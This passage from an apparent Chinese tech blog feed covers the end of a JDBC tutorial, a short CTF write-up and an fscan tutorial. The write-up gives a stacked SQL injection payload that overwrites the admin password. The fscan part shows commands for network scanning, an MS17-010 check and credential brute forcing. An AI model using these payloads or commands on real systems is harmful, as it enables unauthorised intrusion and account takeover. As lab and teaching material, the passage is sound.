或创建PreparedStatement对象</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 执行SQL语句</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line"><span class="comment">// 或使用PreparedStatement</span></span><br><span class="line">pstmt.setInt(<span class="number">1</span>, <span class="number">1001</span>);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 处理结果集</span></span><br><span class="line"><span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">    <span class="comment">// 处理数据...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 关闭资源</span></span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br></pre></td></tr></table></figure></div><h3 id="3-2-使用JDBC连接池"><a href="#3-2-使用JDBC连接池" class="headerlink" title="3.2 使用JDBC连接池"></a>3.2 使用JDBC连接池</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以Apache DBCP为例</span></span><br><span class="line"><span class="type">BasicDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">dataSource.setDriverClassName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">dataSource.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>);</span><br><span class="line">dataSource.setUsername(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">dataSource.setPassword(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">dataSource.setInitialSize(<span class="number">5</span>);</span><br><span class="line">dataSource.setMaxTotal(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line"><span class="comment">// 使用连接...</span></span><br><span class="line">conn.close(); <span class="comment">// 归还到连接池</span></span><br></pre></td></tr></table></figure></div><h2 id="4-使用事务管理"><a href="#4-使用事务管理" class="headerlink" title="4 使用事务管理"></a>4 使用事务管理</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    conn = dataSource.getConnection();</span><br><span class="line">    conn.setAutoCommit(<span class="literal">false</span>); <span class="comment">// 关闭自动提交，开启事务</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行SQL操作</span></span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">ps1</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;UPDATE accounts SET balance = balance - ? WHERE id = ?&quot;</span>);</span><br><span class="line">    ps1.setDouble(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line">    ps1.setInt(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    ps1.executeUpdate();</span><br><span class="line">    </span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">ps2</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;UPDATE accounts SET balance = balance + ? WHERE id = ?&quot;</span>);</span><br><span class="line">    ps2.setDouble(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line">    ps2.setInt(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    ps2.executeUpdate();</span><br><span class="line">    </span><br><span class="line">    conn.commit(); <span class="comment">// 提交事务</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.rollback(); <span class="comment">// 发生异常，回滚事务</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            conn.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="5-使用PreparedStatement防止SQL注入"><a href="#5-使用PreparedStatement防止SQL注入" class="headerlink" title="5. 使用PreparedStatement防止SQL注入"></a>5. 使用PreparedStatement防止SQL注入</h2><p>SQL注入是一种常见的安全漏洞，使用PreparedStatement可以有效防止：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不安全的方式</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>); <span class="comment">// 假设用户输入: &quot;admin&#x27; --&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; AND password = &#x27;anything&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">// 结果SQL: SELECT * FROM users WHERE username = &#x27;admin&#x27; --&#x27; AND password = &#x27;anything&#x27;</span></span><br><span class="line"><span class="comment">// -- 注释掉了密码检查部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 安全的方式：使用PreparedStatement</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line">pstmt.setString(<span class="number">1</span>, username);</span><br><span class="line">pstmt.setString(<span class="number">2</span>, password);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery();</span><br></pre></td></tr></table></figure></div><h2 id="6-批处理操作"><a href="#6-批处理操作" class="headerlink" title="6. 批处理操作"></a>6. 批处理操作</h2><p>批处理可以提高大量数据操作的效率：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">conn.setAutoCommit(<span class="literal">false</span>); <span class="comment">// 批处理通常与事务一起使用</span></span><br><span class="line"></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;INSERT INTO users(name, age) VALUES(?, ?)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加批处理项</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    pstmt.setString(<span class="number">1</span>, <span class="string">&quot;用户&quot;</span> + i);</span><br><span class="line">    pstmt.setInt(<span class="number">2</span>, <span class="number">20</span> + i % <span class="number">30</span>);</span><br><span class="line">    pstmt.addBatch();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 每500条执行一次</span></span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">500</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        pstmt.executeBatch();</span><br><span class="line">        pstmt.clearBatch();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行最后一批</span></span><br><span class="line">pstmt.executeBatch();</span><br><span class="line">conn.commit();</span><br></pre></td></tr></table></figure></div><h2 id="7-数据库元数据"><a href="#7-数据库元数据" class="headerlink" title="7. 数据库元数据"></a>7. 数据库元数据</h2><p>JDBC提供了获取数据库和结果集元数据的API：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取数据库元数据</span></span><br><span class="line"><span class="type">DatabaseMetaData</span> <span class="variable">dbMetaData</span> <span class="operator">=</span> conn.getMetaData();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数据库产品信息</span></span><br><span class="line"><span class="type">String</span> <span class="variable">dbProductName</span> <span class="operator">=</span> dbMetaData.getDatabaseProductName();</span><br><span class="line"><span class="type">String</span> <span class="variable">dbVersion</span> <span class="operator">=</span> dbMetaData.getDatabaseProductVersion();</span><br><span class="line">System.out.println(<span class="string">&quot;数据库: &quot;</span> + dbProductName + <span class="string">&quot; &quot;</span> + dbVersion);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取表信息</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">tables</span> <span class="operator">=</span> dbMetaData.getTables(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;%&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;TABLE&quot;</span>&#125;);</span><br><span class="line"><span class="keyword">while</span> (tables.next()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;表名: &quot;</span> + tables.getString(<span class="string">&quot;TABLE_NAME&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取指定表的列信息</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">columns</span> <span class="operator">=</span> dbMetaData.getColumns(<span class="literal">null</span>, <span class="literal">null</span>, <span class="string">&quot;users&quot;</span>, <span class="string">&quot;%&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (columns.next()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">columnName</span> <span class="operator">=</span> columns.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">dataType</span> <span class="operator">=</span> columns.getString(<span class="string">&quot;TYPE_NAME&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> columns.getInt(<span class="string">&quot;COLUMN_SIZE&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;列名: &quot;</span> + columnName + <span class="string">&quot;, 类型: &quot;</span> + dataType + <span class="string">&quot;, 大小: &quot;</span> + size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取结果集元数据</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line"><span class="type">ResultSetMetaData</span> <span class="variable">rsMetaData</span> <span class="operator">=</span> rs.getMetaData();</span><br><span class="line"><span class="type">int</span> <span class="variable">columnCount</span> <span class="operator">=</span> rsMetaData.getColumnCount();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= columnCount; i++) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;列名: &quot;</span> + rsMetaData.getColumnName(i));</span><br><span class="line">    System.out.println(<span class="string">&quot;列类型: &quot;</span> + rsMetaData.getColumnTypeName(i));</span><br><span class="line">    System.out.println(<span class="string">&quot;列是否可为空: &quot;</span> + rsMetaData.isNullable(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="8-使用try-with-resources自动关闭资源"><a href="#8-使用try-with-resources自动关闭资源" class="headerlink" title="8. 使用try-with-resources自动关闭资源"></a>8. 使用try-with-resources自动关闭资源</h2><p>Java 7引入的try-with-resources语法可以自动关闭JDBC资源：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> dataSource.getConnection();</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">pstmt</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);</span><br><span class="line">) &#123;</span><br><span class="line">    pstmt.setInt(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> pstmt.executeQuery()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名: &quot;</span> + rs.getString(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 所有资源自动关闭，无需显式close()</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="jdbc" scheme="http://example.com/tags/jdbc/"/>
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy</title>
    <link href="http://example.com/2025/04/05/web/ichunqiu/phpstudy/"/>
    <id>http://example.com/2025/04/05/web/ichunqiu/phpstudy/</id>
    <published>2025-04-05T20:30:52.000Z</published>
    <updated>2025-04-26T11:30:29.887Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>绕过随机码–&gt;堆叠注入</p><hr><p>打开网站后只有404<br>抓包，</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Requested-With: XMLHttpRequest</span><br></pre></td></tr></table></figure></div><p>此时我们就可以看见登录的界面了。</p><p>修改密码为123456：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;;UPDATE ADMINS set PASSWORD = &#x27;c26be8aaf53b15054896983b43eb6a65&#x27; where username = &#x27;admin&#x27;;--</span><br></pre></td></tr></table></figure></div><p>登进去了</p><p>flag在&#x2F;flag下面</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="phpstudy_rce" scheme="http://example.com/tags/phpstudy-rce/"/>
    
  </entry>
  
  <entry>
    <title>fscan内网扫描工具详解</title>
    <link href="http://example.com/2025/04/05/web/%E6%B8%97%E9%80%8F/fscan/"/>
    <id>http://example.com/2025/04/05/web/%E6%B8%97%E9%80%8F/fscan/</id>
    <published>2025-04-05T20:30:00.000Z</published>
    <updated>2025-04-26T11:30:29.889Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-fscan工具简介"><a href="#1-fscan工具简介" class="headerlink" title="1. fscan工具简介"></a>1. fscan工具简介</h2><p>fscan是一款开源的内网综合扫描工具，由Shadow Security Team开发，主要用于内网渗透的快速信息收集。该工具集成了端口扫描、服务识别、各类常见漏洞检测、弱口令检测等多种功能，支持多平台运行，是内网渗透测试中的得力助手。</p><h3 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h3><ul><li>多协议端口扫描</li><li>自动服务识别</li><li>常见漏洞检测</li><li>各类服务的弱口令爆破</li><li>支持主机发现</li><li>支持多种输出格式</li><li>单文件、跨平台、无依赖</li></ul><h2 id="2-安装与获取"><a href="#2-安装与获取" class="headerlink" title="2. 安装与获取"></a>2. 安装与获取</h2><h3 id="2-1-获取方式"><a href="#2-1-获取方式" class="headerlink" title="2.1 获取方式"></a>2.1 获取方式</h3><p>从GitHub下载最新版本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/shadow1ng/fscan.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或直接下载编译好的二进制文件</span></span><br><span class="line"><span class="comment"># 访问 https://github.com/shadow1ng/fscan/releases</span></span><br></pre></td></tr></table></figure></div><h3 id="2-2-支持平台"><a href="#2-2-支持平台" class="headerlink" title="2.2 支持平台"></a>2.2 支持平台</h3><p>fscan支持多种操作系统平台：</p><ul><li>Windows (32位&#x2F;64位)</li><li>Linux (32位&#x2F;64位)</li><li>MacOS</li></ul><h2 id="3-基本使用方法"><a href="#3-基本使用方法" class="headerlink" title="3. 基本使用方法"></a>3. 基本使用方法</h2><h3 id="3-1-命令行参数"><a href="#3-1-命令行参数" class="headerlink" title="3.1 命令行参数"></a>3.1 命令行参数</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基本扫描语法</span></span><br><span class="line">./fscan -h 目标IP/子网</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用参数</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -p 1-65535    <span class="comment"># 完整端口扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -p 80,443,3306 <span class="comment"># 指定端口</span></span><br><span class="line">./fscan -h 目标 -o result.txt           <span class="comment"># 保存结果到文件</span></span><br></pre></td></tr></table></figure></div><h3 id="3-2-主要参数说明"><a href="#3-2-主要参数说明" class="headerlink" title="3.2 主要参数说明"></a>3.2 主要参数说明</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h  指定目标IP或网段，支持格式:</span><br><span class="line">    192.168.1.1</span><br><span class="line">    192.168.1.1/24</span><br><span class="line">    192.168.1.1-255</span><br><span class="line">    txt文件(每行一个IP或网段)</span><br><span class="line"></span><br><span class="line">-p  指定扫描端口，默认为常见端口</span><br><span class="line">    示例: -p 80,443,3389</span><br><span class="line">    示例: -p 1-65535</span><br><span class="line">    示例: -p -能力检测时，会自动加载</span><br><span class="line"></span><br><span class="line">-pa 启用全部协议检测，消耗资源较大</span><br><span class="line"></span><br><span class="line">-no 不进行存活探测，直接扫描</span><br><span class="line"></span><br><span class="line">-o  输出结果到文件</span><br><span class="line"></span><br><span class="line">-np 不使用ping进行存活检测</span><br><span class="line"></span><br><span class="line">-nopoc 不扫描漏洞</span><br><span class="line"></span><br><span class="line">-nobr 不进行爆破</span><br><span class="line"></span><br><span class="line">-nolan 不扫描内网资产</span><br></pre></td></tr></table></figure></div><h2 id="4-高级功能使用"><a href="#4-高级功能使用" class="headerlink" title="4. 高级功能使用"></a>4. 高级功能使用</h2><h3 id="4-1-主机发现"><a href="#4-1-主机发现" class="headerlink" title="4.1 主机发现"></a>4.1 主机发现</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅执行主机发现</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ICMP进行存活探测</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -ping</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不使用ping进行存活探测</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -np</span><br></pre></td></tr></table></figure></div><h3 id="4-2-服务识别与漏洞扫描"><a href="#4-2-服务识别与漏洞扫描" class="headerlink" title="4.2 服务识别与漏洞扫描"></a>4.2 服务识别与漏洞扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进行Web服务识别及漏洞扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -web</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描全部漏洞</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -full</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不扫描漏洞</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -nopoc</span><br></pre></td></tr></table></figure></div><h3 id="4-3-弱口令爆破"><a href="#4-3-弱口令爆破" class="headerlink" title="4.3 弱口令爆破"></a>4.3 弱口令爆破</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对所有支持的服务进行弱口令爆破</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -user admin -<span class="built_in">pwd</span> admin123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定爆破特定服务</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m ssh -user admin -<span class="built_in">pwd</span> admin123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义密码字典</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -pwdf passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义用户名字典</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -userf usernames.txt</span><br></pre></td></tr></table></figure></div><h3 id="4-4-自定义扫描"><a href="#4-4-自定义扫描" class="headerlink" title="4.4 自定义扫描"></a>4.4 自定义扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定线程数</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -t 100</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置超时时间</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -<span class="built_in">timeout</span> 5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只扫描特定模块</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m smb,mysql,mssql</span><br></pre></td></tr></table></figure></div><h2 id="5-实际应用示例"><a href="#5-实际应用示例" class="headerlink" title="5. 实际应用示例"></a>5. 实际应用示例</h2><h3 id="5-1-快速内网扫描"><a href="#5-1-快速内网扫描" class="headerlink" title="5.1 快速内网扫描"></a>5.1 快速内网扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 快速扫描内网C段</span></span><br><span class="line">./fscan -h 192.168.1.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">[*] Scanning subnet: 192.168.1.0/24</span><br><span class="line">[+] Found alive host: 192.168.1.1</span><br><span class="line">[+] Found alive host: 192.168.1.100</span><br><span class="line">[+] Found alive host: 192.168.1.254</span><br><span class="line">[*] Scanning port <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">[+] 192.168.1.1:80 open</span><br><span class="line">[+] 192.168.1.1:443 open</span><br><span class="line">[+] Web service detected on 192.168.1.1:80</span><br><span class="line">[*] Scanning port <span class="keyword">for</span> 192.168.1.100</span><br><span class="line">[+] 192.168.1.100:22 open</span><br><span class="line">[+] 192.168.1.100:3306 open</span><br><span class="line">[+] 192.168.1.100:8080 open</span><br><span class="line">[+] MySQL service detected on 192.168.1.100:3306</span><br><span class="line">[+] Web service detected on 192.168.1.100:8080</span><br></pre></td></tr></table></figure></div><h3 id="5-2-定向漏洞扫描"><a href="#5-2-定向漏洞扫描" class="headerlink" title="5.2 定向漏洞扫描"></a>5.2 定向漏洞扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫描特定漏洞</span></span><br><span class="line">./fscan -h 192.168.1.100 -m ms17010</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">[*] Scanning target: 192.168.1.100</span><br><span class="line">[*] Checking MS17-010 vulnerability</span><br><span class="line">[+] 192.168.1.100 is vulnerable to MS17-010</span><br></pre></td></tr></table></figure></div><h3 id="5-3-针对性弱口令检测"><a href="#5-3-针对性弱口令检测" class="headerlink" title="5.3 针对性弱口令检测"></a>5.3 针对性弱口令检测</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对MySQL服务进行弱口令检测</span></span><br><span class="line">./fscan -h 192.168.1.100 -m mysql -user root -pwdf mysql_passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">[*] Scanning MySQL service: 192.168.1.100:3306</span><br><span class="line">[*] Brute forcing MySQL...</span><br><span class="line">[+] MySQL weak password found: root/123456</span><br></pre></td></tr></table></figure></div><h2 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6. 注意事项"></a>6. 注意事项</h2><ol><li><p>权限需求</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 部分功能需要管理员/root权限</span><br><span class="line">sudo ./fscan -h 192.168.1.1/24</span><br></pre></td></tr></table></figure></div></li><li><p>扫描流量</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 大范围扫描会产生大量流量，可能触发IDS/IPS</span><br><span class="line">./fscan -h 192.168.1.1/24 -t 10  # 降低线程数减轻影响</span><br></pre></td></tr></table></figure></div></li><li><p>误报处理</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 漏洞扫描可能存在误报，需要手动验证</span><br><span class="line">./fscan -h 192.168.1.1 -full -o result.txt  # 输出结果后进行人工分析</span><br></pre></td></tr></table></figure></div></li><li><p>合规使用</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 仅在授权的环境中使用</span><br><span class="line"># 未经许可使用可能违反法律法规</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="7-最佳实践"><a href="#7-最佳实践" class="headerlink" title="7. 最佳实践"></a>7. 最佳实践</h2><ol><li><p>分阶段扫描</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一阶段：主机发现</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -m -p -o alive_hosts.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二阶段：端口扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -no -p 1-65535 -o open_ports.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三阶段：漏洞扫描</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -no -full -o vulnerabilities.txt</span><br></pre></td></tr></table></figure></div></li><li><p>针对性扫描</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对Web服务器</span></span><br><span class="line">./fscan -h 192.168.1.100 -p 80,443,8080 -web</span><br><span class="line"></span><br><span class="line"><span class="comment"># 针对数据库服务器</span></span><br><span class="line">./fscan -h 192.168.1.101 -p 1433,3306,5432 -m mysql,mssql,postgresql</span><br></pre></td></tr></table></figure></div></li><li><p>降低影响</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 降低线程数</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -t 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 限制扫描范围</span></span><br><span class="line">./fscan -h 192.168.1.100-110 -p 22,80,443,3306,3389</span><br><span class="line"></span><br><span class="line"><span class="comment"># 避开敏感时间</span></span><br><span class="line"><span class="comment"># 在网络流量低的时段执行扫描</span></span><br></pre></td></tr></table></figure></div></li><li><p>结果分析</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将结果输出到不同文件进行分类分析</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -o scan_results.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用grep提取关键信息</span></span><br><span class="line">grep <span class="string">&quot;weak password&quot;</span> 